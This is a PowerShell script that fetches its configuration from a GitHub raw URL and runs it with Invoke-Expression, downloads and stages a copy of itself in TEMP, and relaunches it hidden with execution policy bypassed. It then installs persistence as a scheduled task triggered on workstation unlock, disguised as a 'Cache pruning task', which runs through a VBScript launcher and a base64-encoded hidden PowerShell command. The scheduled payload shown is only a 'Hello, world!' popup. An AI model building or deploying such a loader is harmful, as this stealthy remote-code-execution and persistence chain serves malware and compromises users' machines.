param(
    [switch]$NoStage,
    [switch]$Uninstall,
    [switch]$Schedule,
    [string]$SourcePath,
    [string]$ConfigFile,
    $Verbose = $false,
    [switch]$Debug,
    [switch]$LocalOnly
)

# Source config file from GitHub using iex on the file directly. No local storage.
# https://raw.githubusercontent.com/lunndal/goat/refs/heads/main/config.psd1
$configFileName = 'config.psd1'
$configUrl = "https://raw.githubusercontent.com/lunndal/goat/refs/heads/main/$configFileName"

$VerbosePreference = if ([System.Convert]::ToBoolean($Verbose)) { 'Continue' } else { 'SilentlyContinue' }


function Get-Config {
    if ($debug) {
        $localConfigPath = if ($ConfigFile) {
            $ConfigFile
        } else {
            Join-Path -Path $PSScriptRoot -ChildPath $configFileName
        }

        Write-Verbose "Debug mode enabled. Loading config from $localConfigPath"
        return Import-PowerShellDataFile -Path $localConfigPath
    } else {
        Write-Verbose "Debug mode disabled. Loading config from $configUrl"
        return Invoke-Expression (New-Object Net.WebClient).DownloadString($configUrl)
    }
}

function Get-AppName {
    $userSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    return $userSid -replace '\d{4}$', '-666'
}

function Install-Script {
    $sourceScript = if ($SourcePath) { $SourcePath } else { $PSCommandPath }
    if (-not $sourceScript) {
        throw 'No staged script file is available for -NoStage.'
    }

    Write-Verbose "Using staged script $sourceScript."
    
    # Determine the full path to the target script within the target directory.
    $targetScript = Join-Path -Path $targetDir -ChildPath $scriptName
    if (-not (Test-Path -Path $targetDir)) {
        New-Item -Path $targetDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        Write-Verbose "Created target directory at $targetDir."
    }

    # Copy the staged script to the target directory.
    Copy-Item -Path $sourceScript -Destination $targetScript -Force
    Write-Verbose "Script copied to target location at $targetScript."
    Install-Job
    
    # Remove temporary staging files after installation.
    if ($sourceScript -like "$env:TEMP*") {
        Remove-Item -Path $sourceScript -Force -ErrorAction SilentlyContinue
        Write-Verbose "Removed staged script at $sourceScript."
    }
}

function Run-Schedule {
    # Pops up terminal with hello world and pauses
    Start-Process powershell -ArgumentList '-NoProfile', '-Command', 'Write-Host "Hello, world!"; pause; exit'
    
}

function Install-Job {
    # Installs a scheduled task called $config.jobName into the generated app folder.
    # The task will run delayed $delay minutes after unlocking of the screen.
    # Task will execute the installed script with -Schedule.
    $taskPath = "\$appName\"
    $taskName = $config.jobName
    $userId = "$env:USERDOMAIN\$env:USERNAME"
    $delay = [int]$config.startupDelay
    $targetScript = Join-Path -Path $targetDir -ChildPath $scriptName
    $scheduleHost = Join-Path -Path $targetDir -ChildPath $config.launcherName

    Write-Verbose "Installing scheduled task $taskPath$taskName."
    Write-Verbose "Scheduled task delay is $delay minutes."
    Write-Verbose "Scheduled task trigger is workstation unlock for $userId."

    $service = New-Object -ComObject Schedule.Service
    $service.Connect()
    $rootFolder = $service.GetFolder('\')

    try {
        Write-Verbose "Opening scheduled task folder $taskPath."
        $folder = $rootFolder.GetFolder($appName)
    } catch {
        Write-Verbose "Creating scheduled task folder $taskPath."
        $folder = $rootFolder.CreateFolder($appName)
    }

    try {
        $folder.DeleteTask($taskName, 0)
        Write-Verbose "Removed existing scheduled task $taskPath$taskName."
    } catch {
        Write-Verbose "No existing scheduled task $taskPath$taskName found."
    }

    Write-Verbose "Creating scheduled task definition."
    $definition = $service.NewTask(0)
    $definition.RegistrationInfo.Description = 'Cache pruning task.'
    $definition.Principal.UserId = $userId
    $definition.Principal.LogonType = 3
    $definition.Principal.RunLevel = 0
    $definition.Settings.ExecutionTimeLimit = 'PT5M'
    $definition.Settings.MultipleInstances = 3

    Write-Verbose "Creating workstation unlock trigger."
    $unlockTrigger = $definition.Triggers.Create(11)
    $unlockTrigger.StateChange = 8
    $unlockTrigger.UserId = $userId
    $unlockTrigger.Delay = "PT$delay`M"

    Write-Verbose "Creating scheduled task action."
    $taskCommand = "& ([scriptblock]::Create((Get-Content -Raw -LiteralPath '$targetScript'))) -Schedule"
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($taskCommand))
    $hostCommand = "CreateObject(""WScript.Shell"").Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand"", 0, False"
    Set-Content -Path $scheduleHost -Value $hostCommand -Encoding ASCII
    Write-Verbose "Created hidden schedule host at $scheduleHost."

    $action = $definition.Actions.Create(0)
    $action.Path = 'wscript.exe'
    $action.Arguments = "//E:VBScript `"$scheduleHost`""

    Write-Verbose "Registering scheduled task $taskPath$taskName."
    try {
        $folder.RegisterTaskDefinition($taskName, $definition, 6, $null, $null, 3) | Out-Null
    } catch {
        throw "Failed to register scheduled task $taskPath$taskName. $($_.Exception.Message)"
    }

    if ($Debug) {
        try {
            $folder.GetTask($taskName) | Out-Null
        } catch {
            throw "Scheduled task $taskPath$taskName was not found after registration. $($_.Exception.Message)"
        }

        Write-Verbose "Confirmed scheduled task $taskPath$taskName is installed."
    }

    Write-Verbose "Installed scheduled task $taskPath$taskName with $delay minute delay."
}

function Stage-Script {
    if ($LocalOnly) {
        $localScriptPath = if ($SourcePath) { $SourcePath } else { $PSCommandPath }
        if (-not $localScriptPath) {
            throw 'No local script file is available for -LocalOnly.'
        }

        Write-Verbose "Copying local script from $localScriptPath to $stagedScript."
        Copy-Item -Path $localScriptPath -Destination $stagedScript -Force
        Write-Verbose "Local script staged to $stagedScript."
    } else {
        Write-Verbose "Downloading the latest version of the script from $($config.scriptUrl) to $stagedScript."
        Invoke-WebRequest -Uri $config.scriptUrl -OutFile $stagedScript -UseBasicParsing
        Write-Verbose "Latest version of the script downloaded to $stagedScript."
    }
}

function Start-StagedScript {
    $configFileArgument = if ($ConfigFile) { " -ConfigFile '$ConfigFile'" } else { '' }
    $debugArgument = if ($Debug -or $LocalOnly) { ' -Debug' } else { '' }
    $command = "& ([scriptblock]::Create((Get-Content -Raw -LiteralPath '$stagedScript'))) -NoStage -SourcePath '$stagedScript'$configFileArgument$debugArgument -Verbose:`$false"
    Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList @('-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command', $command)
    Write-Verbose "Started staged script at $stagedScript."
}

function Uninstall-Script {
    $service = New-Object -ComObject Schedule.Service
    $service.Connect()
    $rootFolder = $service.GetFolder('\')
    $taskFolderName = $appName

    try {
        $taskFolder = $rootFolder.GetFolder($taskFolderName)
        foreach ($task in @($taskFolder.GetTasks(0))) {
            $taskFolder.DeleteTask($task.Name, 0)
            Write-Verbose "Removed scheduled task \$taskFolderName\$($task.Name)."
        }

        $rootFolder.DeleteFolder($taskFolderName, 0)
        Write-Verbose "Removed scheduled task folder \$taskFolderName\."
    } catch {
        Write-Verbose "Scheduled task folder \$taskFolderName\ was not found or could not be removed. $($_.Exception.Message)"
    }

    if (Test-Path -LiteralPath $targetDir) {
        Remove-Item -LiteralPath $targetDir -Recurse -Force
        Write-Verbose "Removed target directory at $targetDir."
    }

    if (Test-Path -LiteralPath $stagedScript) {
        Remove-Item -LiteralPath $stagedScript -Force
        Write-Verbose "Removed staged script at $stagedScript."
    }
}

#
# Main
#

if ($Schedule) {
    Run-Schedule
    return
}

# Load configuration settings
$config = Get-Config
Write-Verbose "Loaded config settings:`n$($config | Out-String)"
$appName = Get-AppName
Write-Verbose "Generated app name: $appName"


# Determine the script name and path from the configuration.
$scriptName = if ($config.localScriptName) { $config.localScriptName } else { 'cache_2.718281228459045' }
$stagedScript = Join-Path -Path $env:TEMP -ChildPath $scriptName
Write-Verbose "Staged script path: $stagedScript"

# Determine the target directory for the installed script based on the config.
$targetDir = if ($config.targetDir) {
    $config.targetDir
} else {
    Join-Path -Path $env:APPDATA -ChildPath "$($config.interrimPath)\$appName"
}
Write-Verbose "Target directory for script: $targetDir"

if ($Uninstall) {
    Uninstall-Script
} elseif ($NoStage) {
    Install-Script
} else {
    Stage-Script
    Start-StagedScript
}



Write-Verbose "Cache prune script execution completed."
# Read-Host "Press Enter to exit."